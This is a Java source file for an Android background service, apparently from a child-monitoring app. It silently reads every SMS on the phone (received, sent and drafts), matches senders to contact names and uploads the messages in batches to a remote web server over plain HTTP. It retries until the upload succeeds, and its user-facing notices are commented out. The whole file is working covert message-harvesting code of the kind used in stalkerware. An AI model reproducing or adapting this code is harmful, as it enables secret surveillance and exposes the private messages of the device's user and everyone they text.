package com.softvilla.childapp;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.provider.ContactsContract;
import android.support.annotation.Nullable;

import com.androidnetworking.AndroidNetworking;
import com.androidnetworking.common.Priority;
import com.androidnetworking.error.ANError;
import com.androidnetworking.interfaces.StringRequestListener;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.Date;
import java.util.List;

/**
 * Created by Hassan on 11/29/2017.
 */

public class SavingMessagesService extends Service {
    Handler handler;
    SharedPreferences preferences;
    Runnable runnable = new Runnable() {
        @Override
        public void run() {

        }
    };
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        return START_STICKY;
    }

    @Override
    public void onCreate() {
        AndroidNetworking.initialize(this);
        preferences = PreferenceManager.getDefaultSharedPreferences(this);
        try {
            handler = new Handler();
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    Utilities utilities = Utilities.findById(Utilities.class, (long) 1);
                    Uri uri = Uri.parse("content://sms");
                    Cursor cursor = getContentResolver().query(uri, null, "_id >" + utilities.LATEST_SMS_ID,
                            null, "_id ASC");

                    if (cursor.moveToFirst()) {

                        try{
                        for (int i = 0; i < cursor.getCount(); i++) {
                            Utilities obj = Utilities.findById(Utilities.class, (long) 1);
                            String body = cursor.getString(cursor.getColumnIndexOrThrow("body")).toString();
                            String number = cursor.getString(cursor.getColumnIndexOrThrow("address")).toString();
                            String date = cursor.getString(cursor.getColumnIndexOrThrow("date")).toString();
                            String id = cursor.getString(cursor.getColumnIndexOrThrow("_id")).toString();
                            Date smsDayTime = new Date(Long.valueOf(date));
                            String type = cursor.getString(cursor.getColumnIndexOrThrow("type")).toString();
                            String name = getContactName(SavingMessagesService.this, number);
                            String typeOfSMS = null;
                            switch (Integer.parseInt(type)) {
                                case 1:
                                    typeOfSMS = "INBOX";
                                    break;

                                case 2:
                                    typeOfSMS = "SENT";
                                    break;

                                case 3:
                                    typeOfSMS = "DRAFT";
                                    break;
                            }


                            if (obj.LATEST_SMS_ID < Long.parseLong(id)) {
                                obj.LATEST_SMS_ID = Long.parseLong(id);
                                obj.save();

                                if (name == null) {
                                    name = "No Name";
                                }
                                SmsTable smsTable = new SmsTable();

                                smsTable.messageBody = body;
                                smsTable.messageDate = smsDayTime.toString();
                                smsTable.messageType = typeOfSMS;
                                smsTable.name = name;
                                smsTable.phoneNumber = number;
                                smsTable.save();
                            }


                            cursor.moveToNext();
                        }
                    }catch (Exception e){
                       //    Toast.makeText(SavingMessagesService.this, e.toString(), Toast.LENGTH_SHORT).show();
                        }

                    }
                    cursor.close();

                    List<SmsTable> messages = SmsTable.findWithQuery(SmsTable.class,"Select * from Sms_Table limit 500");//SmsTable.listAll(SmsTable.class);

                    JSONArray sms = new JSONArray();

                    for(SmsTable obj : messages){
                        JSONObject jsonObject = new JSONObject();

                        try {
                            jsonObject.put("phone_number",obj.phoneNumber);
                            jsonObject.put("message_body",obj.messageBody);
                            jsonObject.put("message_date",obj.messageDate);
                            jsonObject.put("message_type",obj.messageType);
                            jsonObject.put("name",obj.name);
                            jsonObject.put("child_id",preferences.getString("child_id",""));

                            sms.put(jsonObject);
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }

                    }

                    if(messages.size() > 0){
                        //oast.makeText(SavingMessagesService.this, "Size Greater then zero", Toast.LENGTH_SHORT).show();
                        sendSms(sms,messages);
                    }
                    else {
                        //Toast.makeText(SavingMessagesService.this, "Size is zero", Toast.LENGTH_SHORT).show();
                        stopService(new Intent(SavingMessagesService.this,SavingMessagesService.class));
                    }


                    /*AndroidNetworking.post("https://teensafe.000webhostapp.com/Api/uploadSms2")
                            .addBodyParameter("sms",sms.toString()) // posting json
                            .setTag("test")
                            .setPriority(Priority.MEDIUM)
                            .build()
                            .getAsString(new StringRequestListener() {
                                @Override
                                public void onResponse(String response) {
                                    Toast.makeText(SavingMessagesService.this, response, Toast.LENGTH_LONG).show();
                                    if(response.equalsIgnoreCase("success")){
                                        SmsTable.deleteAll(SmsTable.class);
                                    }
                                    stopService(new Intent(SavingMessagesService.this,SavingMessagesService.class));
                                }
                                @Override
                                public void onError(ANError error) {
                                    Toast.makeText(SavingMessagesService.this, error.toString(), Toast.LENGTH_LONG).show();
                                    stopService(new Intent(SavingMessagesService.this,SavingMessagesService.class));
                                    // handle error
                                }
                            });*/

                }
            },300);


        }
        catch (Exception e){
           // Toast.makeText(this, e.toString(), Toast.LENGTH_LONG).show();
        }



        super.onCreate();
    }

    public void sendSms(final JSONArray sms, final List<SmsTable> smsTableList){
        Handler mHandler = new Handler();

        mHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                AndroidNetworking.post("http://noorpublicschool.com/ApiPractice/uploadSms2")
                        .addBodyParameter("sms",sms.toString()) // posting json
                        .setTag("test")
                        .setPriority(Priority.MEDIUM)
                        .build()
                        .getAsString(new StringRequestListener() {
                            @Override
                            public void onResponse(String response) {
                                //Toast.makeText(SavingMessagesService.this, response, Toast.LENGTH_LONG).show();
                                if(response.equalsIgnoreCase("success")){
                                    for(SmsTable smsTable : smsTableList){
                                        smsTable.delete();
                                    }
                                    List<SmsTable> list = SmsTable.findWithQuery(SmsTable.class,"Select * from Sms_Table limit 500");
                                    if(list.size() > 0){
                                        JSONArray jsonArray = new JSONArray();
                                        for(SmsTable obj : list){
                                            JSONObject jsonObject = new JSONObject();

                                            try {
                                                jsonObject.put("phone_number",obj.phoneNumber);
                                                jsonObject.put("message_body",obj.messageBody);
                                                jsonObject.put("message_date",obj.messageDate);
                                                jsonObject.put("message_type",obj.messageType);
                                                jsonObject.put("name",obj.name);
                                                jsonObject.put("child_id",preferences.getString("child_id",""));

                                                jsonArray.put(jsonObject);
                                            } catch (JSONException e) {
                                                e.printStackTrace();
                                            }

                                        }
                                        sendSms(jsonArray,list);
                                    }
                                    else {
                                        stopService(new Intent(SavingMessagesService.this,SavingMessagesService.class));
                                    }
                                    //SmsTable.deleteAll(SmsTable.class);
                                }
                                else {
                                    sendSms(sms,smsTableList);
                                }

                            }
                            @Override
                            public void onError(ANError error) {
                                if(haveNetworkConnection()){
                                    sendSms(sms,smsTableList);
                                }else {
                                    stopService(new Intent(SavingMessagesService.this,SavingMessagesService.class));
                                }
                                //Toast.makeText(SavingMessagesService.this, error.toString(), Toast.LENGTH_SHORT).show();

                                /*if(haveNetworkConnection()){

                                }
                                else {
                                    stopService(new Intent(SavingMessagesService.this,SavingMessagesService.class));
                                }*/
                                //Toast.makeText(SavingMessagesService.this, error.toString(), Toast.LENGTH_LONG).show();
                                // handle error
                            }
                        });
            }
        }, 300);

    }

    public String getContactName(Context context, String phoneNumber) {
        try {
            ContentResolver cr = context.getContentResolver();
            Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                    Uri.encode(phoneNumber));
            Cursor cursor = cr.query(uri,
                    new String[] { ContactsContract.PhoneLookup.DISPLAY_NAME }, null, null, null);
            if (cursor == null) {
                return null;
            }
            String contactName = null;
            if (cursor.moveToFirst()) {
                contactName = cursor.getString(cursor
                        .getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
            }
            if (cursor != null && !cursor.isClosed()) {
                cursor.close();
            }
            return contactName;
        }
        catch (Exception e){
            return "No Name";
        }

    }
    private boolean haveNetworkConnection() {
        boolean haveConnectedWifi = false;
        boolean haveConnectedMobile = false;

        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo[] netInfo = cm.getAllNetworkInfo();
        for (NetworkInfo ni : netInfo) {
            if (ni.getTypeName().equalsIgnoreCase("WIFI"))
                if (ni.isConnected())
                    haveConnectedWifi = true;
            if (ni.getTypeName().equalsIgnoreCase("MOBILE"))
                if (ni.isConnected())
                    haveConnectedMobile = true;
        }
        return haveConnectedWifi || haveConnectedMobile;
    }
}
